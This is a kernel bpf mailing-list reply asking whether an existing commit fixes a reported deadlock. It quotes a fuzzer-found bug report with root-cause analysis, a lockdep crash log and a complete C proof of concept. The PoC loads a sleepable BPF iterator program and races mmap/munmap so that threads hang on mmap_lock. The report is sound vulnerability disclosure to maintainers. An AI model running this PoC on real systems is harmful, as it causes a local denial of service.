Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.208.44
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792596342;
	b=eofAQb3hdnjyRuYLoiDMpjW9eBEwJGJd/f5fjLD5DYki+8JMtM54BumI3qwtxj6zKgQe
	 SPpoXliHESlHGkrA/c7rjz6yFWaedXJ+sRyVULcyD7+iwhY/Pza4gbjEZ12muwD7WEZ7C
	 bh66SAtgypr54/0ongzUimC6nucDYUaU9xkjKBkrIMU4jaI5ixOWiw3Xwqt9WtpAO9pcq
	 2jBa595Yq926cDWUs+bpTEdw2WQQYkXNk5ksEAoTO57f2/plFIW/z1g/SdZr9jFB6fCAi
	 bjSL02twhdbaJDCmBJ+Ml7cWf5DWjjMFq22jdWlJ/sIrf/aXU1pcuKO3pGDD/sZLkCg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792596342;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:Message-ID:Date:
	 MIME-Version:User-Agent:Subject:To:References:Content-Language:From:
	 In-Reply-To:Content-Type:Content-Transfer-Encoding;
	bh=G1Wg6QQAWtiLThS9CJN+E4ApXfN+01iyKZyDl9LpJks=;
	b=xP5H7BQTSJIoqJqHlQG46oopvyeu2YwOzAhFl2DXjDXocxO5aSQTnyAt/Z7sPSV6rFWD
	 iQt3ifMl5dZGrOIsR+9EkD7V8onIROrpcjXX5yKigBvwkmx/ty78VJ+YCGTqxov4A8G+x
	 64/8F39EFmWHFvefut+lpG65XEeHlGTlJkf6eQn11Rx7X877KWO2itp6VO+RvU9y1Hb9F
	 h9iEIe5Ymoemp4nDvh+O1TbEqpTHx+6S9ScCoXFelkzg/3AgKCfC6j+PKmloOxaMh55Wk
	 U3U7ASG4P2IdGN7quBjR7RHPxukG5Ng0Vpub4ssi4d9Nd84LMOBSOg8XcmTFCyG1qMA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=FL0kh72D;
	arc=none smtp.remote-ip=209.85.208.44
Received: from mail-ed1-f44.google.com (mail-ed1-f44.google.com [209.85.208.44])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D438B606A31F
	for <bpf@vger.kernel.org>; Wed, 21 Oct 2026 15:25:41 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org D438B606A31F
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=FL0kh72D
Received: by mail-ed1-f44.google.com with SMTP id 4fb4d7f45d1cf-6b1ec41d8e9so902082a12.0
        for <bpf@vger.kernel.org>; Wed, 21 Oct 2026 08:25:41 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792596340; x=1793201140; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:in-reply-to:from
         :content-language:references:to:subject:user-agent:mime-version:date
         :message-id:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=G1Wg6QQAWtiLThS9CJN+E4ApXfN+01iyKZyDl9LpJks=;
        b=FL0kh72Dj/dNO5hQuFDcWbbqDwlBwb4bab1u0cRqiI9r6NFz2cj+mj3KonQAeXmH4t
         24fbjCqUUn9ja/GOLtZkNGos4eoXCJ8WYOE3T19uQnrM7I+tlzYHguKgkBYWSWIOHFl3
         mgbRfWT4RoyHk3BAt8ZIQx7sOCaQ/gu9Sll+hdMza/27b/fH6edWFeu1VCeWb9Htsv6i
         zZyGh4Ahfkg8Ow2c1lBEzPnSYNeTkQ6BQdntK3J9Pxct2TH/YiRhIsAHGEtXjAQLX2rQ
         E1CGsbIAd13UHRM2qwtpU6R2Jhm3xTGbVr7iWqWVzZ9gSfOsH3b4PlGnjOvTXShkdapA
         nQew==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792596340; x=1793201140;
        h=content-transfer-encoding:content-type:in-reply-to:from
         :content-language:references:to:subject:user-agent:mime-version:date
         :message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=G1Wg6QQAWtiLThS9CJN+E4ApXfN+01iyKZyDl9LpJks=;
        b=jYq5LKg9n11f/NmDOklxijFoDVlwMmCWNM9f2j6h2ADn40TLq+pUpoT9ZeeftO89l6
         nhvvKwQ3cy/Hyn94DSe4IRMwyQP24Sb5WaowQPh2rqVbrtWjJQH5NAz4Tued58tUdeU7
         6dE91zlijE/OgoKv6TGSeKke5hh3iE+H39K9YpKlIgInzzcddvHmu02cNhVQd+wmCiPF
         UpT4he/vYpAgOJKIwcmmndtpCEyVcAaj1yc9Tk9k8PICu78l914MTaasDGKXt0/DfRZU
         dnU80OOOndKNiiNbpUuxnTtlqnfaZVl9OxwprjaTEloHFzkKAs2tYbk0IOxKhmmnexgD
         haqw==
X-Gm-Message-State: AFq9FYIwLbJQCD0gSRVy5THFfv0TTDHnF52hlovPDztK0o+x8tQPlhY+
	XAc3Cj9BE9d1i5QCZPgr+U62M5RXkGIwaDTmPsFtpBfVOSiImVdv+FJQFIOEOIAxr+I=
X-Gm-Gg: AYBFou01DeejY3zHJ4Sk+oaXXGOrfwXRgPjiMLNT4E5jxRF2Br/piM7lO7iUzcXExJ9
	WH7Mmm1Amr+zF971tZ3kaYSpbdSHWrDWVbgMYTYHZWpi3dy88G02eGb3wIXQJhGQM9fhjqP4eqV
	qzJJ1pmOxBhJKxUCrO9TEccLTfERLCUc/kYbBTELrEQveBEa2XbMmJnVgm0jKVpfSN/x6cn7hHo
	ldppYmOG8Q8uHRL2AL/Qs/7N04oGySa23JIUBrcmB2yCT98hGUayJe74H0NReijiP7XV1Vphftj
	ffOEdhimIvqsbRfPTslqmPhJVEHoeGj66LQRGnHkl3R1ZZmJcxc/vdZE+EWoUyiUjGQqUZmMo29
	FUkY5f07fGX2jRCbKHNO+IEft054wMK6zFRLxJiXhAZ4mbrplxAtskQOgtFxvq0bAT7EGBAPTY7
	xSHnKafhTdC317c7iLOtRr7QaET+ryadNf95y44ox6weNfySNg5/xL+D86I7XCXHTXRkNmiTLRX
	BQ5KfhjGuSBa4/AzN52LwxsDFVwj2Xw540vZmLp/mAo8owNgP7AQPV0U0IsQcj0nB6vq8PYK5A/
	EDSSrcOJMLidp3X+We9OJi0vh9GgeDPchewgVVM=
X-Received: by 2002:a17:906:9f88:b0:c26:19e3:e98d with SMTP id a640c23a62f3a-c4679a16d56mr215681066b.45.1792596340008;
        Wed, 21 Oct 2026 08:25:40 -0700 (PDT)
Received: from ?IPV6:2a02:8109:a307:d900:d295:bbc7:1cf4:dbab? ([2a02:8109:a307:d900:d295:bbc7:1cf4:dbab])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c468a562f1fsm13772766b.34.2026.10.21.08.25.39
        for <bpf@vger.kernel.org>
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Wed, 21 Oct 2026 08:25:39 -0700 (PDT)
Message-ID: <a2bf6709-f040-416d-8170-d1296b565fe0@gmail.com>
Date: Wed, 21 Oct 2026 16:25:38 +0100
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: BUG: Sleepable BPF prog causes a deadlock in task_vma bpf_iter
To: bpf@vger.kernel.org
References: <5c890061.12435.1a1572fd75a.Coremail.kaiyanm@hust.edu.cn>
Content-Language: en-US
From: Mykyta Yatsenko <mykyta.yatsenko5@gmail.com>
In-Reply-To: <5c890061.12435.1a1572fd75a.Coremail.kaiyanm@hust.edu.cn>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit



On 10/20/26 3:41 AM, 梅开彦 wrote:
> Our fuzzer tool discovered a deadlock vulnerability in the BPF
> subsystem. A sleepable BPF program attached to a task_vma iterator runs
> while the iterator holds the target task's `mmap_lock`, and the
> sleepable execution context allows the program to take page faults on
> user memory (e.g. through `bpf_copy_from_user()`, which performs a
> plain `copy_from_user()`). The page fault handler then re-acquires the
> same `mmap_lock`, and a concurrent writer on the same mm turns the
> recursion into a real ABBA deadlock that leaves two threads of the
> process stuck in uninterruptible D state. Lockdep flags the same
> defect as "possible recursive locking detected" via the `might_fault()`
> assertion in `bpf_iter_run_prog()`.
> 
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
> 
> ## Root Cause
> 
> 1. `task_vma_seq_get_next()` (kernel/bpf/task_iter.c) takes the read
>    lock of the target task's `mm->mmap_lock` and holds it while running
>    the BPF program:
> 
> ```c
> 		if (mmap_read_lock_killable(curr_mm)) {
> 			mmput(curr_mm);
> 			goto finish;
> 		}
> ```
> 
> 2. `bpf_iter_run_prog()` (kernel/bpf/bpf_iter.c) explicitly allows the
>    sleepable program to take page faults:
> 
> ```c
> 	if (prog->sleepable) {
> 		rcu_read_lock_trace();
> 		migrate_disable();
> 		might_fault();
> ```
> 
> 3. `bpf_copy_from_user()`
>    (kernel/bpf/helpers.c) does a plain `copy_from_user()`, so a page
>    fault takes `down_read(&mm->mmap_lock)` again via
>    `lock_mm_and_find_vma()` (non-killable). With a writer queued between
>    the two acquisitions, the reader blocks indefinitely.
> 
> 4. Lockdep detects the same recursion through its annotation:
>    `might_fault()` (mm/memory.c) performs
>    `might_lock_read(&current->mm->mmap_lock)` -- the same lock class
>    that is already held, hence the "possible recursive locking
>    detected" warning.
> 
> Root cause: the task_vma iterator runs sleepable BPF programs while
> holding `mmap_lock`, even though the BPF iterator execution contract
> (`might_fault()` in `bpf_iter_run_prog()`) explicitly allows the program
> to take page faults on that same lock.
> 

Is this fixed by dfcd17659112 ("bpf: Reject sleepable programs for task_vma iterator")?

> ## Execution Flow Visualization
> 
> ```
> Vulnerability Execution Flow
> |
> |--- 1. Sleepable BPF_TRACING prog, expected_attach_type = BPF_TRACE_ITER,
> |       attach_btf_id = vmlinux BTF FUNC "bpf_iter_task_vma"
> |
> |--- 2. bpf(BPF_LINK_CREATE) + bpf(BPF_ITER_CREATE) -> iterator fd
> |
> |--- 3. read(iter_fd)
> |    |
> |    `-- bpf_seq_read -> task_vma_seq_get_next
> |        |   `--> mmap_read_lock_killable(curr_mm)          [outer READ, held]
> |        `-- task_vma_seq_show -> bpf_iter_run_prog (sleepable)
> |              `--> bpf_copy_from_user(unmapped addr) -> page fault
> |                    -> down_read(mm->mmap_lock)          [inner READ, non-killable]
> |
> |--- 4. Another thread of the same process: mmap()/munmap() loop
> |    |
> |    `--> down_write(mm->mmap_lock) queued behind the outer read lock
> |
> `--- inner reader waits for the writer, writer waits for the outer reader
>      => both threads stuck in D state (real ABBA deadlock);
>         lockdep reports the same recursion as "possible recursive
>         locking detected" (via might_fault() in bpf_iter_run_prog())
> ```
> 
> ## Reproduction Steps
> 
> 1. Load a sleepable (`BPF_F_SLEEPABLE`) `BPF_PROG_TYPE_TRACING` program
>    with `expected_attach_type = BPF_TRACE_ITER` and
>    `attach_btf_id = <vmlinux BTF id of "bpf_iter_task_vma">`.
> 2. `bpf(BPF_LINK_CREATE)` + `bpf(BPF_ITER_CREATE)` to get the iterator
>    fd.
> 3. Spawn a thread doing `mmap()/munmap()` in a loop.
> 4. `read()` from the iterator fd. When the iterator reaches the reading
>    process's own mm, both threads hang.
> 
> ## Crash Report
> 
> The original fuzzer crash report (kernel
> `7.3.0-rc4-g61c1e63c9b65-dirty #9`, crash
> `4e5cba057fd1e1d7a473942ce22d1981be8a2e68`, full log in
> `crash-lockdep.log`):
> 
> ```
> ============================================
> WARNING: possible recursive locking detected
> 7.3.0-rc4-g61c1e63c9b65-dirty #9 Not tainted
> --------------------------------------------
> syz-executor419/9405 is trying to acquire lock:
> ff1100017d169078 (&mm->mmap_lock){++++}-{4:4}, at: __might_fault mm/memory.c:7443 [inline]
> ff1100017d169078 (&mm->mmap_lock){++++}-{4:4}, at: __might_fault+0xe5/0x190 mm/memory.c:7437
> 
> but task is already holding lock:
> ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: mmap_read_lock_killable include/linux/mmap_lock.h:609 [inline]
> ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: task_vma_seq_get_next+0x5d2/0x8b0 kernel/bpf/task_iter.c:521
> 
> other info that might help us debug this:
>  Possible unsafe locking scenario:
> 
>        CPU0
>        ----
>   lock(&mm->mmap_lock);
>   lock(&mm->mmap_lock);
> 
>  *** DEADLOCK ***
> 
>  May be due to missing lock nesting notation
> 
> locks held by syz-executor419/9405: 3, last CPU#1:
>  #0: ff11000112349518 (&p->lock){+.+.}-{4:4}, at: bpf_seq_read+0x63/0x1210 kernel/bpf/bpf_iter.c:102
>  #1: ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: mmap_read_lock_killable include/linux/mmap_lock.h:609 [inline]
>  #1: ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: task_vma_seq_get_next+0x5d2/0x8b0 kernel/bpf/task_iter.c:521
>  #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: rcu_try_lock_acquire include/linux/rcupdate.h:314 [inline]
>  #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: rcu_read_lock_trace include/linux/rcupdate_trace.h:101 [inline]
>  #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: bpf_iter_run_prog+0xc6/0xfc0 kernel/bpf/bpf_iter.c:686
> 
> stack backtrace:
> CPU: 1 UID: 0 PID: 9405 Comm: syz-executor419 Not tainted 7.3.0-rc4-g61c1e63c9b65-dirty #9 PREEMPT(full) 
> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
> Call Trace:
>  <TASK>
>  __dump_stack lib/dump_stack.c:94 [inline]
>  dump_stack_lvl+0x116/0x1b0 lib/dump_stack.c:120
>  print_deadlock_bug+0x293/0x3d0 kernel/locking/lockdep.c:3085
>  check_deadlock kernel/locking/lockdep.c:3137 [inline]
>  validate_chain kernel/locking/lockdep.c:3939 [inline]
>  __lock_acquire+0x153c/0x2110 kernel/locking/lockdep.c:5288
>  lock_acquire kernel/locking/lockdep.c:5942 [inline]
>  lock_acquire+0x1bf/0x370 kernel/locking/lockdep.c:5899
>  __might_fault mm/memory.c:7443 [inline]
>  __might_fault+0x115/0x190 mm/memory.c:7437
>  bpf_iter_run_prog+0x24b/0xfc0 kernel/bpf/bpf_iter.c:688
>  __task_vma_seq_show kernel/bpf/task_iter.c:623 [inline]
>  task_vma_seq_show+0x128/0x1a0 kernel/bpf/task_iter.c:628
>  bpf_seq_read+0x1db/0x1210 kernel/bpf/bpf_iter.c:137
>  vfs_read+0x1eb/0xc80 fs/read_write.c:572
>  ksys_read+0x126/0x240 fs/read_write.c:716
>  do_syscall_x64 arch/x86/entry/syscall_64.c:61 [inline]
>  do_syscall_64+0x128/0x7b0 arch/x86/entry/syscall_64.c:84
>  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> RIP: 0033:0x7f2fec1f428d
> Code: 28 c3 e8 46 1e 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
> RSP: 002b:00007ffd1739fb68 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
> RAX: ffffffffffffffda RBX: 00007ffd1739fd68 RCX: 00007f2fec1f428d
> RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000005
> RBP: 0000000000000001 R08: 00007ffd1739fd68 R09: 00007ffd1739fd68
> R10: 00007ffd1739fd68 R11: 0000000000000246 R12: 0000000000000001
> R13: 00007ffd1739fd58 R14: 00007f2fec271530 R15: 0000000000000001
>  </TASK>
> ```
> 
> ## Proof of Concept
> 
> The following C program can demonstrate the vulnerability on bpf-next
> commit 61c1e63c9b651a77b1e24208b9361965c69959e6 (7.3.0-rc4).
> 
> ```c
> #define _GNU_SOURCE
> #include <errno.h>
> #include <pthread.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/mman.h>
> #include <sys/syscall.h>
> #include <unistd.h>
> 
> #define BPF_PROG_LOAD		5
> #define BPF_LINK_CREATE		28
> #define BPF_ITER_CREATE		33
> 
> #define BPF_PROG_TYPE_TRACING	26
> #define BPF_TRACE_ITER		28	/* value in this kernel tree */
> #define BPF_F_SLEEPABLE		0x10
> 
> /* vmlinux BTF FUNC id of "bpf_iter_task_vma"
>  * (bpftool btf dump file /sys/kernel/btf/vmlinux |
>  *  grep "FUNC 'bpf_iter_task_vma'")
>  */
> #define BTF_ID_BPF_ITER_TASK_VMA	208826
> 
> struct bpf_insn {
> 	uint8_t	code;
> 	uint8_t	dst_reg:4, src_reg:4;
> 	uint16_t off;
> 	int32_t	imm;
> };
> 
> static int sys_bpf(int cmd, void *attr, size_t size)
> {
> 	return syscall(__NR_bpf, cmd, attr, size);
> }
> 
> static void *thr_writer(void *arg)
> {
> 	(void)arg;
> 	for (;;) {
> 		void *p = mmap((void *)0x30000000000UL, 0x1000, PROT_READ | PROT_WRITE,
> 			       MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
> 		if (p != MAP_FAILED)
> 			munmap(p, 0x1000);
> 	}
> 	return NULL;
> }
> 
> int main(void)
> {
> 	struct bpf_insn insns[] = {
> 		{ .code = 0xbf, .dst_reg = 1, .src_reg = 10 },	/* r1 = r10           */
> 		{ .code = 0x07, .dst_reg = 1, .imm = -32 },	/* r1 += -32  (dst)   */
> 		{ .code = 0xb7, .dst_reg = 2, .imm = 32 },	/* r2 = 32    (size)  */
> 		{ .code = 0x18, .dst_reg = 3, .imm = 0x10000 },	/* r3 = 0x10000 (ld_imm64 lo, unmapped user addr) */
> 		{ .code = 0x00 },				/* (ld_imm64 hi)      */
> 		{ .code = 0x85, .imm = 148 },			/* call bpf_copy_from_user (plain copy_from_user) */
> 		{ .code = 0xb7, .dst_reg = 0 },			/* r0 = 0             */
> 		{ .code = 0x95 },				/* exit               */
> 	};
> 	char license[] = "GPL";
> 
> 	static char vlog[65536];
> 	uint8_t pattr[0x78] = { 0 };
> 	*(uint32_t *)(pattr + 0x00) = BPF_PROG_TYPE_TRACING;	/* prog_type           */
> 	*(uint32_t *)(pattr + 0x04) = sizeof(insns) / sizeof(insns[0]);
> 	*(uint64_t *)(pattr + 0x08) = (uint64_t)insns;
> 	*(uint64_t *)(pattr + 0x10) = (uint64_t)license;
> 	*(uint32_t *)(pattr + 0x18) = 1;			/* log_level           */
> 	*(uint32_t *)(pattr + 0x1c) = sizeof(vlog);		/* log_size            */
> 	*(uint64_t *)(pattr + 0x20) = (uint64_t)vlog;		/* log_buf             */
> 	*(uint32_t *)(pattr + 0x2c) = BPF_F_SLEEPABLE;		/* prog_flags          */
> 	*(uint32_t *)(pattr + 0x44) = BPF_TRACE_ITER;		/* expected_attach_type*/
> 	*(uint32_t *)(pattr + 0x6c) = BTF_ID_BPF_ITER_TASK_VMA;	/* attach_btf_id       */
> 
> 	int prog_fd = sys_bpf(BPF_PROG_LOAD, pattr, sizeof(pattr));
> 	if (prog_fd < 0) { fprintf(stderr, "prog_load: %m\n%.*s\n", (int)sizeof(vlog), vlog); return 1; }
> 
> 	/* link_create: no iter_info -> BPF_TASK_ITER_ALL; the iterator will
> 	 * eventually reach our own task (curr_mm == current->mm) */
> 	uint8_t lattr[0x20] = { 0 };
> 	*(uint32_t *)(lattr + 0x00) = prog_fd;
> 	*(uint32_t *)(lattr + 0x04) = 0;			/* target_fd           */
> 	*(uint32_t *)(lattr + 0x08) = BPF_TRACE_ITER;		/* attach_type         */
> 
> 	int link_fd = sys_bpf(BPF_LINK_CREATE, lattr, sizeof(lattr));
> 	if (link_fd < 0) { perror("link_create"); return 1; }
> 
> 	uint8_t iattr[8] = { 0 };
> 	*(uint32_t *)(iattr + 0x00) = link_fd;
> 	int iter_fd = sys_bpf(BPF_ITER_CREATE, iattr, sizeof(iattr));
> 	if (iter_fd < 0) { perror("iter_create"); return 1; }
> 
> 	printf("armed: pid=%d iter_fd=%d; starting writer + reader\n", getpid(), iter_fd);
> 	fflush(stdout);
> 
> 	pthread_t t;
> 	pthread_create(&t, NULL, thr_writer, NULL);
> 
> 	static char buf[8192];
> 	/* read() runs the prog on our own mm while holding its read lock. */
> 	ssize_t n = read(iter_fd, buf, sizeof(buf));
> 	printf("read returned %zd (errno=%d) -- no deadlock\n", n, errno);
> 	return 0;
> }
> ```
> 
> ## Kernel Configuration Requirements for Reproduction
> 
> The vulnerability can be triggered with the kernel config in the
> attachment.

